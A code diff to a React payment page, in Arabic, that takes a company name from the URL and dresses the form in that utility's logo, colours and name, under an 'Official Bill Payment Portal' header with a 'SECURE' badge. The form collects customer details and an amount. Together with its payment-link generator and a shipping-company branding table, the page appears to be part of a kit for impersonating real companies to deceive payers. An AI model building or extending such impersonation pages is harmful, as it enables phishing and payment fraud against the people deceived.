@@ -5,12 +5,13 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { MapPin, CreditCard, Building2, User, Phone, Hash, ArrowLeft, RefreshCw, CheckCircle, Copy, ExternalLink } from "lucide-react";
+import { MapPin, CreditCard, Building2, User, Phone, Hash, ArrowLeft, RefreshCw, CheckCircle, Copy, ExternalLink, Lock } from "lucide-react";
+import { cn } from "@/lib/utils";
 import BrandedTopBar from "@/components/BrandedTopBar";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { shippingCompanyBranding } from "@/lib/brandingSystem";
+import { shippingCompanyBranding, utilityBranding, getBrandingByCompany } from "@/lib/brandingSystem";
 import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { generatePaymentLink } from "@/utils/paymentLinks";
@@ -40,9 +41,10 @@ const LocalPaymentPage = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [copied, setCopied] = useState(false);
 
-  const serviceKey = "local_payment";
+  const urlParams = new URLSearchParams(window.location.search);
+  const serviceKey = urlParams.get('service') || "local_payment";
   const branding = getServiceBranding(serviceKey);
-  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
+  const companyBranding = getBrandingByCompany(serviceKey);
 
   const serviceTypes = [
     { id: "electricity", nameAr: "فاتورة الكهرباء", nameEn: "Electricity Bill" },
@@ -95,74 +97,99 @@ const LocalPaymentPage = () => {
     }
   };
 
+  const isUtility = !!utilityBranding[serviceKey.toLowerCase()];
+  const currentBranding = isUtility ? utilityBranding[serviceKey.toLowerCase()] : branding;
+
   return (
     <>
       <PaymentMetaTags
-        serviceName="السداد المحلي"
+        serviceName={currentBranding?.nameAr || "السداد المحلي"}
         serviceKey={serviceKey}
         amount={amount ? `${amount} ريال` : ""}
-        title="السداد المحلي - دفع الفواتير والخدمات"
-        description="ادفع فواتير الخدمات المحلية بسهولة وأمان"
+        title={`${currentBranding?.nameAr || "السداد المحلي"} - دفع الفواتير والخدمات`}
+        description={`ادفع فواتير ${currentBranding?.nameAr || "الخدمات المحلية"} بسهولة وأمان`}
       />
 
-      <BrandedTopBar 
-        serviceKey={serviceKey}
-        serviceName="السداد المحلي"
-        showBackButton={true}
-        showCarousel={false}
-      />
+      {isUtility ? (
+        <header className="bg-white border-b-4 h-20 flex items-center px-6 sticky top-0 z-50" style={{ borderBottomColor: currentBranding.colors.primary }}>
+           <div className="container mx-auto flex items-center justify-between">
+              <div className="flex items-center gap-4">
+                 <img src={currentBranding.logoUrl} className="h-12" alt={currentBranding.nameEn} />
+                 <div className="h-10 w-px bg-gray-100 hidden sm:block" />
+                 <div className="hidden sm:block">
+                    <h1 className="text-lg font-black text-gray-800">{currentBranding.nameAr}</h1>
+                    <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Official Bill Payment Portal</p>
+                 </div>
+              </div>
+              <div className="flex items-center gap-2">
+                 <div className="px-4 py-2 bg-blue-50 text-blue-600 rounded-full text-xs font-black flex items-center gap-2 border border-blue-100">
+                    <Lock className="w-4 h-4" /> <span>SECURE</span>
+                 </div>
+              </div>
+           </div>
+        </header>
+      ) : (
+        <BrandedTopBar
+          serviceKey={serviceKey}
+          serviceName="السداد المحلي"
+          showBackButton={true}
+          showCarousel={false}
+        />
+      )}
 
-      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
+      {!isUtility && <BrandedCarousel serviceKey={serviceKey} className="mb-0" />}
 
       <div 
         className="min-h-screen py-6 sm:py-8" 
         dir="rtl"
         style={{
-          background: identity ? `linear-gradient(135deg, ${identity.colors.background}, ${identity.colors.secondary}15)` : `linear-gradient(135deg, #E6FFE6, #00C00015)`,
-          fontFamily: identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
+          background: isUtility ? '#f8fafc' : identity ? `linear-gradient(135deg, ${identity.colors.background}, ${identity.colors.secondary}15)` : `linear-gradient(135deg, #E6FFE6, #00C00015)`,
+          fontFamily: isUtility ? currentBranding.fonts.arabic : identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
         }}
       >
         <div className="container mx-auto px-3 sm:px-4">
           <div className="max-w-2xl mx-auto">
             <Card 
-              className="p-4 sm:p-8 shadow-2xl border-t-4 relative overflow-hidden" 
+              className={cn("p-4 sm:p-8 shadow-2xl border-t-4 relative overflow-hidden", isUtility ? "rounded-none border-t-8" : "rounded-[2rem]")}
               style={{ 
-                borderTopColor: identity?.colors.primary || '#008000',
-                boxShadow: '0 20px 60px -15px rgba(0, 128, 0, 0.3)',
-                borderRadius: '16px',
+                borderTopColor: isUtility ? currentBranding.colors.primary : identity?.colors.primary || '#008000',
+                boxShadow: isUtility ? '0 10px 40px -10px rgba(0,0,0,0.08)' : '0 20px 60px -15px rgba(0, 128, 0, 0.3)',
                 background: '#FFFFFF'
               }}
             >
-              <div 
-                className="absolute top-0 left-0 right-0 h-1"
-                style={{
-                  background: `linear-gradient(90deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`
-                }}
-              />
+              {!isUtility && (
+                <div
+                  className="absolute top-0 left-0 right-0 h-1"
+                  style={{
+                    background: `linear-gradient(90deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`
+                  }}
+                />
+              )}
 
               <form onSubmit={handleSubmit}>
-                <div className="flex items-center justify-between mb-6 sm:mb-8">
+                <div className="flex items-center justify-between mb-6 sm:mb-8 border-b pb-6">
                   <div>
                     <h1 
-                      className="text-xl sm:text-3xl font-bold mb-1"
+                      className="text-xl sm:text-3xl font-black mb-1"
                       style={{ 
-                        color: identity?.colors.primary || '#008000',
-                        fontFamily: identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
+                        color: isUtility ? currentBranding.colors.primary : identity?.colors.primary || '#008000',
                       }}
                     >
-                      السداد المحلي
+                      {isUtility ? currentBranding.nameAr : "السداد المحلي"}
                     </h1>
-                    <p className="text-sm text-muted-foreground">ادفع فواتير الخدمات بسهولة</p>
+                    <p className="text-sm text-gray-400 font-bold">{isUtility ? currentBranding.description : "ادفع فواتير الخدمات بسهولة"}</p>
                   </div>
 
-                  <div
-                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
-                    style={{
-                      background: `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`,
-                    }}
-                  >
-                    <Building2 className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
-                  </div>
+                  {!isUtility && (
+                    <div
+                      className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                      style={{
+                        background: `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`,
+                      }}
+                    >
+                      <Building2 className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                    </div>
+                  )}
                 </div>
 
                 <div className="space-y-4 mb-6">
@@ -266,20 +293,25 @@ const LocalPaymentPage = () => {
                 </div>
 
                 <div 
-                  className="p-4 rounded-xl mb-6"
+                  className={cn("p-6 mb-8 transition-all duration-500", isUtility ? "bg-slate-50 border-r-4" : "rounded-3xl bg-opacity-10")}
                   style={{
-                    background: `${identity?.colors.primary || '#008000'}10`,
-                    border: `1px solid ${identity?.colors.primary || '#008000'}30`
+                    backgroundColor: isUtility ? '#F8FAFC' : `${identity?.colors.primary || '#008000'}10`,
+                    borderRightColor: isUtility ? currentBranding.colors.primary : identity?.colors.primary || '#008000',
+                    borderRightWidth: isUtility ? '4px' : '0'
                   }}
                 >
                   <div className="flex items-center justify-between">
-                    <span className="font-bold">المبلغ الإجمالي</span>
-                    <span 
-                      className="text-2xl font-bold"
-                      style={{ color: identity?.colors.primary || '#008000' }}
-                    >
-                      {amount ? `${amount} ريال` : '---'}
-                    </span>
+                    <span className="font-bold text-slate-500 uppercase tracking-tight text-xs">المبلغ الإجمالي المستحق</span>
+                    <div className="text-right">
+                      <span
+                        key={amount}
+                        className="text-3xl font-black block animate-in fade-in zoom-in duration-300"
+                        style={{ color: isUtility ? currentBranding.colors.primary : identity?.colors.primary || '#008000' }}
+                      >
+                        {amount ? `${parseFloat(amount).toLocaleString()} ريال` : '---'}
+                      </span>
+                      <span className="text-[10px] text-slate-400 font-bold">شامل ضريبة القيمة المضافة</span>
+                    </div>
                   </div>
                 </div>
 
@@ -287,10 +319,9 @@ const LocalPaymentPage = () => {
                   type="submit"
                   size="lg"
                   disabled={isSubmitting || !customerName || !customerPhone || !serviceType || !accountNumber || !amount || !city}
-                  className="w-full text-lg py-7 text-white font-bold shadow-2xl transition-all active:scale-95"
+                  className={cn("w-full text-xl py-8 text-white font-black shadow-2xl transition-all active:scale-95", isUtility ? "rounded-none" : "rounded-2xl")}
                   style={{
-                    background: `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`,
-                    fontFamily: identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
+                    background: isUtility ? currentBranding.colors.primary : `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`,
                   }}
                 >
                   {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : (
